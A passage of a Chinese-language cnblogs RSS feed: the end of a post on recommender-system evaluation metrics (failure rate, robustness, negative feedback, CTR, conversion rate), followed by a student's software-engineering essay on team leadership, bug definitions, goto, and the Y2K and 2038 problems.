&lt;p&gt;意义：对于一些社区类产品UGC内容的推荐，用户生产的优质是整个社区最重要的一部分，及时的曝光用户的新内容对于增加用户留存和给社区增添活力都有很大的帮助，因此需要这两个指标来评估推荐算法对于新内容的推荐能力。&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;失效率&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;168&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;173&quot;&gt;定义： 表示系统没有推荐或推荐后未被用户点击数据占全集的比例。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-alignment bi-alignment-center&quot; data-key=&quot;174&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;176&quot;&gt;失效率 = &lt;span&gt;$\frac{S(0)}{S} $&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;177&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;179&quot;&gt;S(0) 表示实际点击次数为 0 的数据个数；S表示推荐集合的总数。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;180&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;182&quot;&gt;首先需要定义一个时间范围来计算没有被推荐出的。其含义为最终未被用户真正感知的数据的占比，未感知包含未推荐和推荐出去后未被点击的内容。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;183&quot; readability=&quot;10.5&quot;&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;&lt;span data-key=&quot;153&quot;&gt;健壮性&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;158&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;160&quot;&gt;定义：算法健壮性的评测主要利用模拟攻击。首先，给定一个数据集和一个算法，可以用这个算法给这个数据集中的用户生成推荐列表。然后，用常用的攻击方法向数据集中注入噪声数据，然后利用算法在注入噪声后的数据集上再次给用户生成推荐列表。最后，通过比较攻击前后推荐列表的相似度评测算法的健壮性。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;161&quot; readability=&quot;11&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;163&quot;&gt;总结：适合在离线环境进行完成，针对模型本身的评测。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;除了上面介绍的通过这些指标的方法来进行评估，当推荐真正运用在业务上，通过业务侧的一些数据反馈也可以知道推荐算法的好坏。具体看下面两项：&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;&lt;span data-key=&quot;153&quot;&gt;负反馈&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;158&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;160&quot;&gt;定义：负反馈相当于一个轻量级便携的用户反馈，用户可以直接对推荐出的内容给与反馈，推荐系统在拿到了用户实时反馈后就会立刻针对反馈信息对推荐结果做出相应的调整，而我们也可以在事后拿到负反馈的整体数据来评价推荐系统在用户侧是否有重大舆情产生&lt;/span&gt;。一般app的推荐都会有负反馈机制，如图：&lt;/p&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;159&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/626346/201903/626346-20190304232829274-443490501.png&quot; alt=&quot;&quot; width=&quot;484&quot; height=&quot;363&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;161&quot; readability=&quot;7.5&quot;&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;ctr&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;158&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;160&quot;&gt;Click-Througt-Rate，即点击率，点击数/曝光数。推荐算法效果的最最重要指标，没有之一。一般算法好不好，都会直接用这个指标直接定义。通常算法模型在迭代的过程中都会进行ab test，所谓ab test就是有一个基准桶，一个对比桶，通过收集两个不同方案在用户侧的点击率，来评估算法的好坏，一般来说当流量特别大的时候，基本上一个ab实验上线几分钟就可以出算法的好坏了。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;ctr&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;158&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;160&quot;&gt;Conversation Rate，即转化率，转化数/点击数。通常在广告上用的比较多，对于商品来说也就是用户最终点击并且购买的转化率。因为最终决定转化的因素还是比较多的，不单单是推荐算法影响的，所以这个指标通常不做为模型迭代优化的衡量标准，但是由于其和最终的&quot;钱&quot;挂钩，所以一般领导会更加关注这个指标。&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;总结：&lt;/p&gt;
&lt;p&gt;~&lt;/p&gt;


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</description>
<pubDate>Mon, 04 Mar 2019 15:31:00 +0000</pubDate>
<dc:creator>胖喵~</dc:creator>
<og:description>◆版权声明：本文出自胖喵~的博客，转载必须注明出处。 转载请注明出处：https://www.cnblogs.com/by-dream/p/10450880.html 在taobao做推荐算法的质量工</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/by-dream/p/10450880.html</dc:identifier>
</item>
<item>
<title>【软工作业&amp;思考】关于软工的一些概念性理解暨第一次阅读作业 - HansBug</title>
<link>http://www.cnblogs.com/HansBug/p/10473959.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/HansBug/p/10473959.html</guid>
<description>&lt;h2 id=&quot;概述&quot;&gt;概述&lt;/h2&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;4.4895833333333&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;0.90909090909091&quot;&gt;&lt;td&gt;本次作业所属课程&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://edu.cnblogs.com/campus/buaa/BUAA_SE_2019_RJ&quot;&gt;2019BUAA软件工程 周二班&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2.5957446808511&quot;&gt;&lt;td&gt;本次作业要求&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://edu.cnblogs.com/campus/buaa/BUAA_SE_2019_RJ/homework/2626&quot;&gt;第1次个人作业&lt;/a&gt;&lt;br/&gt;当然，比这个更重要百倍的还是实实在在的思考，这也是标题如此命名的原因&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;我在本课程的目标&lt;/td&gt;
&lt;td&gt;在原有实践经验的基础上，系统化学习软工领域的理论知识，总结以前以及现在的得与失，提高自身知识水平（&lt;del&gt;怎么一股生命在流逝的味道&lt;/del&gt;）&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;本次作业的帮助&lt;/td&gt;
&lt;td&gt;将《构建之法》与实际经验进行结合&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;好吧，既然是概述，那么就先说点什么，光一个表格个人感觉表现力太有限了。&lt;strong&gt;如果对笔者的自报家门没啥兴趣的话，可以直接跳到下一节&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;首先，本人很早就有计算机方面的技术背景（早到什么程度呢，我学编程那会，Google在大陆还能直接上，QQ号还都是8位的），在编程方面，私以为还算是略知一二，或者说有那么一点点的经验。&lt;/p&gt;
&lt;p&gt;其次，本人在大一开始就进行过实用系统的开发，其中包括：&lt;/p&gt;
&lt;p&gt;嘛。。。先打住，再这样下去实在有点像是产品软文了。[捂脸]&lt;/p&gt;
&lt;p&gt;此外，笔者带过不止一个技术开发团队，作为团队的leader。踩过坑，也从屎山里面爬出来过；胜利过，也失败过；团队里大家一块嗨过，也层不止一度出现严重分歧，甚至分崩离析过。其中，私以为还算是有一点点略微的心得。&lt;/p&gt;
&lt;p&gt;说这些的目的呢，其实特别简单。笔者从没认为自己如何如何，只是阐述一下客观事实，做一些微小的工作，或者说，铺垫。以防止下面看到有些内容的时候，被认为是在分享刚编的故事。&lt;/p&gt;
&lt;p&gt;好了打住，先说到这。下面是正文。&lt;/p&gt;
&lt;h2 id=&quot;个人的思考&quot;&gt;个人的思考&lt;/h2&gt;
&lt;p&gt;其实说来，本人的疑惑和思考可能和大部分同学有些不一样。所以我就尽量按照我的方式来表达，并且可以的话也说一些我对其他同学疑惑的理解吧。&lt;/p&gt;
&lt;h3 id=&quot;思考一pm做开发和测试之外的所有事情&quot;&gt;思考一：PM做开发和测试之外的所有事情&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;PM做开发和测试之外的所有事情&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这话确实很有道理，说的也没错。（&lt;del&gt;或者倒不如说，非技术背景出身的PM也没办法插手这事&lt;/del&gt;）&lt;/p&gt;
&lt;p&gt;然而，&lt;strong&gt;要是，PM也是技术背景出身，甚至还是有一定经验的技术人员呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;笔者自己就遇到过类似的情况。&lt;/p&gt;
&lt;p&gt;在笔者之前早期带的团队里面，就是会出现有的时候全体进展缓慢的情况。这个其实也正常，都是身边的同学，不是谁都有写过十几年的代码的。&lt;/p&gt;
&lt;p&gt;于是，尤其是ddl迫近的时候，笔者我当时遇到这样的情况，常常自己就看不下去了。一拍腿，老子自己上。&lt;/p&gt;
&lt;p&gt;果不其然，自己一上阵，问题最终就很快被解决了。&lt;/p&gt;
&lt;p&gt;如果只从结果的角度来看，这当然是皆大欢喜——这世上从来就没有过啥好手段坏手段，能解决问题的就是最好的。&lt;/p&gt;
&lt;p&gt;对于临时的小队伍来说，这还算好，最起码结果是好的。&lt;strong&gt;然而之后发生的事情证明，这种做法对于长期的团队来说，这是一件非常危险的事&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;笔者带过的一个团队，当时就这么干的。期初几次，笔者一个人单挑的成效都很不错。越到后来，就发现大家都开始起不到作用。笔者甚至一度很生气，去质问过他们，甚至逼过他们。可是最终，笔者得出了一个令人绝望的答案——&lt;strong&gt;他们真的啥也不会了&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;或者换句话说，&lt;strong&gt;在该锻炼队伍成员，该磨合团队协作模式的时候，这些事情一样都没有做&lt;/strong&gt;。最终，这个所谓被称之为团队的东西，完全成了由一个强力单体，和若干起不到任何作用的人，构成的乌合之众。&lt;strong&gt;对于强力单体，看似有团队，实则孤立无援，最终迟早被硬生生累垮&lt;/strong&gt;。&lt;strong&gt;对于其他人，看似有团队，实则毫无归属感，自然不可能愿意卖力，就算愿意，也并不能真正的帮上忙&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;这还不算完，&lt;strong&gt;如果有一天，这个团队的强力单体出现了状况的话，那么，这个所谓的团队，会立刻面临灭顶之灾，且毫无自保的能力&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;这样的故事其实历史上已经上演过无数次：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;诸葛亮鞠躬尽瘁，死而后已。他在的时候，把三国中最弱的蜀国治理的井井有条。然而他事必躬亲，于是导致的局面就是，其他不如他的人才完全没有成长的空间。等他一死，蜀国一下子就出现了严重的人才断层。很快，蜀国就灭亡了。&lt;/li&gt;
&lt;li&gt;月厨们都知道，Saber生前的经历。甘愿当圣人，想要一己之力拯救臣民。然而等有一天光辉不再的时候，就注定要面临生命中的卡姆兰之丘。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;所以，个人认为。&lt;strong&gt;就算PM，或者说领导，有着极强的个人输出能力，也绝对不可以随随便便就亲自上阵&lt;/strong&gt;（当然，偶尔救急可以，但是绝不可以成为常态）。&lt;strong&gt;不是因为什么领导的架子，而是出于整个团队的可持续发展考虑&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;不过，&lt;strong&gt;这里面具体的分寸，也确实是一个值得深思的问题&lt;/strong&gt;。从一碗鸡汤爬出来，立马跳进另一碗鸡汤，也不是正确的思考问题方式。笔者也认为，自己目前这块实际上做得还远远不够成熟。&lt;/p&gt;
&lt;h3 id=&quot;思考二bug的定义&quot;&gt;思考二：Bug的定义&lt;/h3&gt;
&lt;p&gt;问题源自&lt;a href=&quot;https://www.cnblogs.com/buaaguzhanpeng/p/10466836.html&quot;&gt;guzhanpeng同学的博客&lt;/a&gt;。第一个疑问，里面说到了bug的定义问题。&lt;/p&gt;
&lt;p&gt;首先我想说的是，Bug本身就不是一种单一的定义。&lt;/p&gt;
&lt;p&gt;这位同学百度搜索到的结果是：&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;程序错误（英语：Bug），是程序设计中的术语，是指在软件运行中因为程序本身有错误而造成的功能不正常、死机、数据丢失、非正常中断等现象&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个当然没有错，这个是程序设计意义上的bug。&lt;/p&gt;
&lt;p&gt;然而，实际上从用户、从需求的角度来说，不符合需求的，就是bug。这个bug是产品需求意义上的bug。&lt;strong&gt;这两者并不存在矛盾抑或是冲突&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;或者也可以说，&lt;strong&gt;bug可以一般性定义为和期望不符的状态及其诱因&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;对于程序而言，结果错误、运行时错误、崩溃，这确实就是和期望的正确结果不符的状态。&lt;/li&gt;
&lt;li&gt;对于产品而言，你程序就算对了，但是人家要个苹果你给人家运来一车梨，还美其名曰梨很好吃我们也很辛苦，这显然就是在扯淡了。没错，这也是与期望状态不符的状态。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;综上，其实&lt;strong&gt;所谓bug的两种定义（当然，也可能有更多的层面），本质还是统一的，只是站在了不同的需求立场上而已&lt;/strong&gt;。前者是程序层面的正确，后者是产品层面的更优。&lt;strong&gt;根本上，BUG与否，还是取决于想要的是什么&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;思考三领头羊是否必要&quot;&gt;思考三：领头羊是否必要&lt;/h3&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;17.1 “领导力”中，强调了团队领导的重要性。联想到即将开始的团队编程，领导该如何确定？很可能出现两种情况：一种是团队里有个大牛，由于他的技术最好，大家都听他的。另一种是大家互相讨论，少数服从多数，实际上没有一个真正的领导。实际上，由于大家都是技术人员，对项目方向上的把控水平可能都差不多，所以我认为没有领导的小团队，应该也是可以的吧？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个是来自于&lt;a href=&quot;https://www.cnblogs.com/bvb1909/p/10457115.html#4191845&quot;&gt;Jason同学的问题&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;先说结论，&lt;strong&gt;要，而且非常重要&lt;/strong&gt;。然后，请听我慢慢分析。&lt;/p&gt;
&lt;p&gt;这位同学的观点中，有这么一句&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;团队里有个大牛，由于他的技术最好，大家都听他的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;这句话本身也是错的&lt;/strong&gt;。错的原因，思考一中已经有了详细的说明。即便在决策层面，要是决策权完全捆绑在了一个emperor的头上，那么这就像极了封建专制制度（没有褒义或者贬义）——一人独裁。&lt;/p&gt;
&lt;p&gt;一人独裁的好处是很明显的，显然这位同学也明白这个好处——只要这个leader足够的靠谱。但是一人独裁的坏处，其实和好处一样的明显——&lt;strong&gt;只要这个leader不够靠谱，团队的结局就注定只有灭亡&lt;/strong&gt;。中国历朝历代无数的开国之君，和亡国之君，他们都已经用他们一生的经历，向后人证明了这件事。&lt;/p&gt;
&lt;p&gt;那么既然不应该一人独裁，那么，就应该绝对的民主么？答案是否定的。&lt;/p&gt;
&lt;p&gt;反面教材，其实也很好找——现在的很多欧美国家，也就是很多人口中“皿煮”的圣地，就会存在这样的问题。是的没错，他们的三权分立、议会制，确实在权利的制约平衡上做的相当不错。&lt;/p&gt;
&lt;p&gt;然而这样也带来了新的问题。俗话说得好——屁股决定脑袋。各方的立场与利益不太可能总是一致，既然不一致，那么在这样的体制下，不同势力之间的&lt;strong&gt;通力协作将变得几乎不可能&lt;/strong&gt;，反而完全变成了权力的博弈战，&lt;strong&gt;内耗极其严重&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在人的团队中，虽然没那么复杂，但是大致道理也是类似的——&lt;strong&gt;如果一个团队，没有一个明确的领头羊的话，那么这个团队的秩序将是很大的问题&lt;/strong&gt;。而秩序，则对于达到团队最优解而言，是至关重要的。简而言之，如果一个团队里面，仅仅是因为所有人水平都差不多就所有人地位绝对一致的话，那么带来的后果就是团队工作的协调和调度上将会变得极为困难，甚至出现&lt;strong&gt;集体负责，等于集体不负责&lt;/strong&gt;的情况。遇了事情，意见不一，始终没人拍个板，也是一件非常麻烦的事。&lt;/p&gt;
&lt;p&gt;就笔者本身而言，笔者也曾在整体实力较强的团队里面待过（在那个团队里面，几乎所有人都有和笔者差不多少的实力），然而那个团队依然是有个leader的存在，统筹规划着整个团队的事务进展，一板一眼调配着资源。其他人也都参与决策，各抒己见，但是犹豫不决之时，一定是leader拍板。&lt;/p&gt;
&lt;p&gt;综上，我的结论是，&lt;strong&gt;领头羊是必要的，但是也不可以搞成整个团队只有唯一的领头羊参与决策&lt;/strong&gt;。&lt;strong&gt;民主是必要的，但是过度的民主还不如专制来的靠谱&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;思考四编程之法&quot;&gt;思考四：编程之法&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;只要有助于程序逻辑的清晰体现，什么方法都可以使用，包括goto。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这话，在现在看起来是个政治不太正确的话，尤其是在这个已经广泛推荐使用结构化程序设计的年代，这听上去似乎确实像是历史的倒退。&lt;/p&gt;
&lt;p&gt;然而，&lt;strong&gt;这句话的本质确实对的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;看到有些同学认为这话不对，其实我觉得，他们只是&lt;strong&gt;没有理清楚因和果的关系&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;首先，在软件开发的蛮荒时代，先辈们之所以提出了结构化程序设计，原因就是，不结构化的话，程序质量将变得难以保证，工程项目也将难以维护。于是指定了一个标准，供后人参考。&lt;/p&gt;
&lt;p&gt;然而，不要忘了，&lt;strong&gt;这个标准的意义在于，让软件质量变得更好&lt;/strong&gt;。而不应该是反过来的。&lt;/p&gt;
&lt;p&gt;早在先秦，商鞅便说过&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;治世不一道，便国不法古。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;任何的法度，任何的规则，其根本目的都只有一个——追求最优地解决问题&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;而如果死搬教条，却反而忽视了问题的本质，走的太远忘了为啥而出发的话，那就是买椟还珠的笑话了。&lt;/p&gt;
&lt;h3 id=&quot;思考五猪鸡和鹦鹉的故事&quot;&gt;思考五：猪、鸡和鹦鹉的故事&lt;/h3&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;&lt;strong&gt;加入一个团队时，要弄清楚自己在团队中投入的级别是什么，别人的期望值是什么。不要拿着卖白菜的钱，操那卖白粉的心——太不值得。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这句话，其实是大实话，也是笔者认为很多同龄人始终没想明白的一件事。&lt;/p&gt;
&lt;p&gt;实际上某种程度，团队成员和团队的关系，与软件产品和甲方的关系，还是颇为类似的——前者是卖家，后者是买家。&lt;strong&gt;前者买卖的是生产力（以及潜在的价值），后者买卖的是产品本身&lt;/strong&gt;。本质上，都不过是供求关系而已。&lt;/p&gt;
&lt;p&gt;正如上文中关于bug的论述&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;人家要一个苹果，你给人家拉来一车梨，纵使你说这梨子如何如何好吃我们如何如何辛苦，可是你就是没给人家需要的东西，那就是扯淡。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;没错，&lt;strong&gt;如果你提供的东西，其实并不是人家所需要的，那么你对于人家而言的价值就是零。如果你甚至还认为自己劳苦功高，认为人家有义务把你当大爷一样的供着，那就不仅是没价值，还会惹人生厌了。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这些话，看上去很政治不正确。实际上，每一个真正当过技术团队的leader，办过实事，招过兵买过马的leader，都会明白这句话的含义。（&lt;del&gt;笔者曾经招过一些“学霸”进自己的小团队，然而后来发现这人考试能力是不差，可是给团队几乎带不来什么效益，甚至可以说干啥啥不行。不仅如此，还自视甚高，认为是我们团队对不起他。这样的人，用上面的话说，他们对于应试教育而言，是完美的。但是他们对于技术团队而言，那就是有BUG的。&lt;/del&gt;）&lt;/p&gt;
&lt;p&gt;其实这些车轱辘话说来说去，&lt;strong&gt;根本矛盾还是供求关系&lt;/strong&gt;。笔者认为，这个问题也是软件工程，甚至是整个产业界，的根本问题之一。&lt;/p&gt;
&lt;p&gt;显然，从团队成员角度，确实是应该好好掂量对方对自己的期望的：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果对方对你期望很高，你却实际上根本不可能办到，那么即便人家给你开价再高，你也最好走为上策，&lt;strong&gt;这是做人最基本的素质&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;如果对方对你期望很低，而你实际上可以创造比这个高的价值的话，那么笔者认为：
&lt;ul&gt;&lt;li&gt;你可以想办法&lt;strong&gt;让leader（或者甲方）认同你的价值，然后一起创造更大的价值&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;如果上一条行不通，那么根据笔者的经验，你*&lt;strong&gt;给他们想要的就好了&lt;/strong&gt;（笔者之前就遇到过难以沟通的需求甲方）&lt;/li&gt;
&lt;li&gt;当然，如果实在不爽的话，也可以选择跳槽。&lt;strong&gt;既然没机会兼济天下，那么独善其身也可以作为次级的选择&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;从团队的角度，那么该做的是这样的：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;尽力去观察团队成员，和他们多沟通，了解他们切实的需求，然后，&lt;strong&gt;尽量给他们想要的&lt;/strong&gt;（这很重要，&lt;strong&gt;供求关系，实际上也应该是双方面的，各取所需的合作关系才有稳定的可能&lt;/strong&gt;）&lt;/li&gt;
&lt;li&gt;如果沟通了，发现这样的人真的没有价值的话（当然也可能只是对我们团队没用），那么也&lt;strong&gt;没必要强留，看着办即可&lt;/strong&gt;（当然，条件允许的话也可以先留着，毕竟多条人脉总有用得着的时候）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;以上，就是笔者对团队内供求关系的理解。&lt;/p&gt;
&lt;h2 id=&quot;软件的起源&quot;&gt;软件的起源&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;化学家和统计学家约翰·图基（John W. Tukey）在1958年撰写一篇科学文章时，首次使用“软件”这一术语。据报道，他早在1953年就已经提出这个词，用来标记计算机程序（即“软件）与使用这些程序的计算机（或“硬件”）之间的区别。&lt;strong&gt;软件的概念被提出&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;软件工程的最初概念，是1968年Margaret Hamilton在阿波罗计划期间提出来的。&lt;strong&gt;软件，开始和工程接轨&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;1968年NATO会议上首次提出“软件工程”（Software Engineering）的概念，提出把软件开发从“艺术”和“个体行为”向“工程”和“群体协同工作”转化。其基本思想是应用计算机科学理论和技术以及工程管理原则和方法，按照预算和进度，实现满用户要求的软件产品的定义、开发、发布和维护的工程。从此也诞生了一门新的学科——软件工程。&lt;strong&gt;软件工程这门学科算是正式诞生了&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;冷知识趣闻&quot;&gt;冷知识、趣闻&lt;/h2&gt;
&lt;h3 id=&quot;世界上第一个bug&quot;&gt;世界上第一个BUG&lt;/h3&gt;
&lt;p&gt;1945年9月，美国海军编程员、编译器的发明者格蕾斯·哈珀正带着他的小组构造一个叫“马克二型”的计算机。这个计算机使用了大量的继电器， 一种电子机械装置。虽然已进入9月，但天气依然炎热，房间里没有空调， 所有窗户都敞开散热。为了早日将“马克二型”构造完成，格蕾斯·哈珀带着小组成员夜以继日的工作。&lt;/p&gt;
&lt;p&gt;所谓好事多磨，在9月9日下午三点，电视剧情节般的意外如期而至。突然，“马克二型”死机了，而技术人员尝试了许多方法，最后才定位到第70号继电器出错。要知道，“马克二型”用了1万7千多个继电器。&lt;/p&gt;
&lt;p&gt;既然找到是70号继电器出错了，那么接下来的事情也就好办了。格蕾斯·哈珀仔细观察这个出错的继电器，然后发现一只被继电器打死了的飞蛾躺在中间。于是格蕾斯·哈珀小心的用镊子将飞蛾夹出来，用透明胶布将飞蛾贴到“事件记录本”中，并注明“第一个发现Bug的实例”。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/703546/201903/703546-20190304230251612-507905484.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;没错，世界上第一个BUG，还真就是一直虫子。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;千年虫问题与2038危机&quot;&gt;千年虫问题与2038危机&lt;/h3&gt;
&lt;p&gt;千年虫问题（摘自百度百科）：&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;计算机2000年问题，又叫做“千年虫”、“电脑千禧年千年虫问题”或“千年危机”。缩写为“Y2K”。是指在某些使用了计算机程序的智能系统（包括计算机系统、自动控制芯片等）中，由于其中的年份只使用两位十进制数来表示，因此当系统进行（或涉及到）跨世纪的日期处理运 算时（如多个日期之间的计算或比较等），就会出现错误的结果，进而引发各种各样的系统功 能紊乱甚至崩溃。因此从根本上说千年虫是一种程序处理日期上的bug（计算机程序故障），而非病毒。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;2038危机（摘自百度百科）：&lt;/p&gt;
&lt;blockquote readability=&quot;30.714022140221&quot;&gt;
&lt;p&gt;也许大家都已经知道计算机的2000年问题是什么概念，但是什么时候又冒出来一个2038年问题的呢？&lt;/p&gt;
&lt;p&gt;用C语言编制的程序不会碰到2000年问题，但是会有2038年问题。这是因为，大多数C语言程序都使用到一个叫做“标准时间库”的&lt;a href=&quot;https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F%E5%BA%93&quot;&gt;程序库&lt;/a&gt;，这个时间库用一个标准的4字节也就是32位的形式来储存时间信息。&lt;/p&gt;
&lt;p&gt;当初设计的时候，这个4字节的时间格式把1970年1月1日凌晨0时0分0秒（这个时间名叫 the Unix Epoch）作为时间起点，这时的时间值为0。以后所有的时间都是从这个时间开始一秒一秒累积得来的。&lt;/p&gt;
&lt;p&gt;比方说如果时间已经累积到了919642718这个数值，就是说这时距离 the Unix Epoch已经过去了919642718秒，换算一下就应该是1999年2月21日16时18分38秒。&lt;/p&gt;
&lt;p&gt;这样计算时间的好处在于，把任意两个时间值相减之后，就可以很迅速地得到这两个时间之间相差的秒数，然后你可以利用别的程序把它换算成明白易懂的年月日时分秒的形式。&lt;/p&gt;
&lt;p&gt;要是你曾经读过一点儿关于计算机方面的书，你就会知道一个4&lt;a href=&quot;https://baike.baidu.com/item/%E5%AD%97%E8%8A%82&quot;&gt;字节&lt;/a&gt;也就是32位的存储空间的最大值是2147483647，请注意！2038年问题的关键也就在这里———当时间一秒一秒地跳完2147483647那惊心动魄的最后一秒后，你猜怎么样？&lt;/p&gt;
&lt;p&gt;答案是，它就会转为负数也就是说时间无效。那一刻的准确的时间为2038年1月19日星期二凌晨03:14:07，之后所有用到这种“标准时间库”的C语言程序都会碰到时间计算上的麻烦。&lt;/p&gt;
&lt;p&gt;这就是2038年问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其实，这类的问题还有很多：&lt;/p&gt;
